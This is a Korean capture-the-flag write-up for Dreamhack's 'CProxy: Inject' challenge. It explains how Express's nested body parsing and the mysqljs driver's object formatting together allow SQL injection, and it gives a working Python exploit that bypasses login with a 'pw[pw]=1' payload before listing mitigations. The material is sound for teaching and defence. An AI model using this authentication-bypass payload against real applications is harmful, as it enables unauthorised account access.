# CProxy: Inject

[문제 링크](https://dreamhack.io/wargame/challenges/677)

## 문제 분석

이 문제는 외부 URL에 대신 요청을 보내고 응답을 데이터베이스와 캐시에 기록하는 웹 프록시 서비스(`CProxy`)를 대상으로 합니다. Express의 본문 파싱 미들웨어 설정과 Node.js `mysql` 드라이버의 쿼리 바인딩 동작 방식을 결합해 `admin_inject` 계정으로 인증을 우회하고, 저장된 프록시 요청 기록(`/api/history/1`)에서 플래그를 획득하는 구조입니다.

### 1. `index.js`

```javascript
const app = express();

// 세션 미들웨어 등록: 로그인한 사용자의 uid를 서버 세션에 유지함
app.use(session({
	secret: SESSION_SECRET,
	resave: true,
	saveUninitialized: true
}));

// URL-encoded 본문 파싱 미들웨어 등록 (extended 옵션 생략 시 기본값 true 적용)
app.use(express.urlencoded());
```

`express-session` 미들웨어를 통해 사용자의 로그인 상태(`req.session.uid`)를 유지하며, `express.urlencoded()` 미들웨어를 등록해 클라이언트가 전송한 `application/x-www-form-urlencoded` 형식의 요청 본문을 파싱하여 `req.body` 객체에 바인딩합니다.

프록시 요청을 처리하는 `/proxy` 라우트 코드는 다음과 같습니다.

```javascript
app.get('/proxy', requireAuth, async (req, res, next) => {
    const {scheme, host, port, path} = req.query;
    
    const url = await net.buildUrl(scheme, host, port, path, bypassDns=true);
    const cacheKey = url ? hashKey(url) : undefined;
    const cachedRes = url ? cache.get(cacheKey) : undefined;

    if (cachedRes === undefined) {
        req.cacheKey = cacheKey;
        next();
    } else {
        net.sendResponse(res, cachedRes);
    }
}, async (req, res) => {
    const param = {};
    for (c of ['scheme', 'host', 'port', 'path']) {
        param[c] = req.param(c);
    }
    const {scheme, host, port, path} = param;

    const url = await net.buildUrl(scheme, host, port, path);
    if (url === undefined) {
        return res.sendStatus(404);
    }

    const proxyRes = await net.get(url);
    if (proxyRes === undefined) {
        return res.sendStatus(404);
    }

    net.sendResponse(res, proxyRes);
    delete proxyRes.headers['set-cookie'];
    await db.insertResponse(req.session.uid, proxyRes);
    cache.set(req.cacheKey, proxyRes);
});
```

`/proxy` 엔드포인트는 다음 순서로 동작합니다.

- **인증 확인 (`requireAuth`)**: 세션에 `uid`가 존재하는 로그인 사용자만 접근을 허용합니다.
- **URL 구성 및 캐시 조회**: 쿼리 파라미터(`scheme`, `host`, `port`, `path`)로 요청 URL을 조합한 뒤 해시 키를 생성하여 인메모리 캐시에 저장된 응답이 있는지 확인합니다.
- **프록시 요청 수행**: 캐시된 응답이 없으면 `net.get(url)`을 호출해 대상 서버로 HTTP 요청을 전송합니다.
- **응답 기록 저장**: 수신한 응답에서 `set-cookie` 헤더를 제거한 뒤 `db.insertResponse(req.session.uid, proxyRes)`를 호출하여 현재 사용자의 프록시 히스토리로 데이터베이스에 저장합니다. 저장된 히스토리는 `/api/history/:idx` 엔드포인트를 통해 조회할 수 있습니다.

### 2. `db.js`

```javascript
const mysql = require('mysql');
const util = require('util');

const conn = mysql.createConnection({
	host     : 'db',
	user     : 'cproxy',
	password : 'cproxy',
	database : 'cproxy'
});

const query = util.promisify(conn.query).bind(conn);

async function doRegister(id, pw) {
    try {
        await query("INSERT INTO users (id, pw) VALUES (?, ?)", [id, pw]);
        return true;
    } catch {
        return false;
    }
}

async function doLogin(id, pw) {
    try {
        const res = await query("SELECT uid FROM users WHERE id=? AND pw=?", [id, pw]);
        return res[0].uid;
    } catch {
        return undefined;
    }
}
```

데이터베이스 연동에는 `mysql`(`mysqljs/mysql`) 패키지가 사용되며, 로그인 시 `doLogin(id, pw)` 함수가 `?` 플레이스홀더에 `[id, pw]` 배열을 바인딩하여 `users` 테이블에서 일치하는 계정의 `uid`를 조회합니다. 데이터베이스 초기화 스크립트에는 플래그가 담긴 프록시 히스토리를 보유한 `admin_inject` 계정이 생성되어 있습니다.

---

## 취약점 분석

### 1. `express.urlencoded()`의 `extended` 기본값과 중첩 객체 파싱

`express.urlencoded()`는 `application/x-www-form-urlencoded` 본문을 파싱하여 `req.body`에 저장합니다. 일반적인 요청이 전달될 때의 파싱 결과는 다음과 같습니다.

```http
POST /auth HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=admin&pw=1234
```

```javascript
req.body = {
    id: 'admin',
    pw: '1234'
};
```

이때 `express.urlencoded()`에 옵션을 명시하지 않으면 Express 4 기준 `extended: true`가 기본값으로 적용됩니다.

```javascript
// extended 옵션을 생략하면 기본값으로 extended: true가 설정됨
app.use(express.urlencoded({
    extended: true
}));
```

- `extended: false`인 경우: Node.js 내장 `querystring` 모듈을 사용하여 평면적인 문자열 키-값 쌍만 파싱합니다.
- `extended: true`인 경우: `qs` 라이브러리를 사용하여 대괄호(`[]`) 표기법이 포함된 파라미터를 중첩 객체(Object)나 배열(Array)로 파싱합니다. 예를 들어 본문에 `id=admin_inject&pw[pw]=1`을 전송하면 `req.body.pw`는 문자열이 아니라 `{ pw: '1' }`이라는 JavaScript 객체가 됩니다.

### 2. `mysql` 모듈의 Object 타입 바인딩에 의한 SQL Injection

`mysqljs/mysql` 라이브러리의 `conn.query()`는 데이터베이스 엔진 수준의 Prepared Statement 프로토콜을 사용하지 않고, 클라이언트 측(`SqlString.format`)에서 `?` 플레이스홀더를 직접 이스케이프 및 치환하여 완성된 SQL 문자열을 MySQL 서버로 전송합니다.

이 과정에서 바인딩 파라미터의 자료형에 따라 치환 규칙이 달라지며, 파라미터로 **객체(Object)**가 전달되면 `SqlString.objectToValues()` 함수가 객체의 각 프로퍼티를 `` `key` = 'value' `` 형태의 SQL 조건식으로 변환합니다.

공격자가 로그인 요청(`/auth`) 시 `id`에 `"admin_inject"`, `pw`에 객체 `{ pw: 1 }`을 전달하면 다음과 같이 쿼리 문자열이 생성됩니다.

```sql
-- 원본 쿼리 템플릿
SELECT uid FROM users WHERE id=? AND pw=?

-- pw 자리에 { pw: '1' } 객체가 바인딩되어 치환된 실제 실행 쿼리
SELECT uid FROM users WHERE id='admin_inject' AND pw=`pw` = '1'
```

MySQL에서 `AND pw=`pw` = '1'` 조건절은 연산자 우선순위에 따라 좌측부터 순서대로 평가됩니다.

1. 먼저 ``pw = `pw` ``가 계산됩니다. 동일 행의 `pw` 컬럼 값과 자기 자신을 비교하므로 `pw` 값이 `NULL`이 아닌 이상 항상 참(`1`)으로 평가됩니다.
2. 이어서 앞선 비교 결과인 `1`과 우측의 `'1'`을 비교하는 `1 = '1'` 연산이 수행되며, 이 역시 참(`1`)이 됩니다.

결과적으로 실제 비밀번호를 알지 못하더라도 `WHERE` 조건절이 참이 되어 `admin_inject` 계정의 `uid`가 반환되고, 세션에 `admin_inject`의 인증 정보가 저장됩니다.

---

## 익스플로잇

### 공격 순서

1. 로그인 엔드포인트(`/auth`)로 `id=admin_inject`와 `pw[pw]=1` 데이터를 담아 `POST` 요청을 전송합니다.
2. `express.urlencoded()`가 `pw`를 `{ pw: '1' }` 객체로 파싱하고, `mysql` 드라이버가 이를 ``pw=`pw` = '1'``로 치환하여 `admin_inject` 계정으로 로그인이 완료됩니다.
3. 발급된 세션 쿠키를 유지한 상태로 `/api/history/1` 엔드포인트에 `GET` 요청을 보내 `admin_inject` 계정의 첫 번째 프록시 요청 히스토리에 저장된 플래그를 조회합니다.

### 익스플로잇 코드

위 과정을 수행하는 Python 코드는 다음과 같습니다.

```python
import requests

# 대상 문제 서버 주소 설정
url = "http://host3.dreamhack.games:[port]"

# pw[pw]=1 파라미터를 통해 서버의 req.body.pw가 { 'pw': '1' } 객체로 파싱되도록 구성함
data = {
    "id": "admin_inject",
    "pw[pw]": 1
}

# 로그인 세션을 유지하기 위해 Session 객체 생성
req = requests.session()

# 1. /auth 엔드포인트에 POST 요청을 보내 admin_inject 계정으로 로그인 수행
res = req.post(url + "/auth", data=data)
print(res.status_code)

# 2. 획득한 세션으로 /api/history/1에 접근하여 저장된 프록시 응답(플래그) 출력
print(req.get(url + "/api/history/1").json()['data'])
```

스크립트를 실행하면 `/api/history/1`의 JSON 응답 내 `data` 필드에서 플래그가 출력됩니다.

---

## 결론

이 문제는 `express.urlencoded()`의 중첩 객체 파싱 기능과 `mysqljs/mysql` 드라이버의 클라이언트 측 객체 포매팅 동작이 결합될 때 발생하는 SQL Injection 취약점을 다룹니다.

이와 같은 취약점을 방지하기 위한 대응 방안은 다음과 같습니다.

1. **입력값 타입 검증**: 컨트롤러나 라우트 핸들러에서 `typeof id === 'string' && typeof pw === 'string'`과 같이 파라미터가 단일 문자열 타입인지 명시적으로 확인하거나, `zod`, `joi` 등의 스키마 검증 라이브러리를 적용해야 합니다.
2. **쿼리 빌더 및 드라이버 설정 강화**: `mysql` 드라이버 연결 설정에서 `stringifyObjects: true` 옵션을 활성화하면 객체가 SQL 조각으로 변환되지 않고 일반 문자열로 이스케이프됩니다. 또는 서버 측 바이너리 프로토콜 기반의 Prepared Statement를 지원하는 `mysql2` 라이브러리의 `execute()` 메서드를 사용하면 타입 혼동에 의한 쿼리 구조 변조를 차단할 수 있습니다.
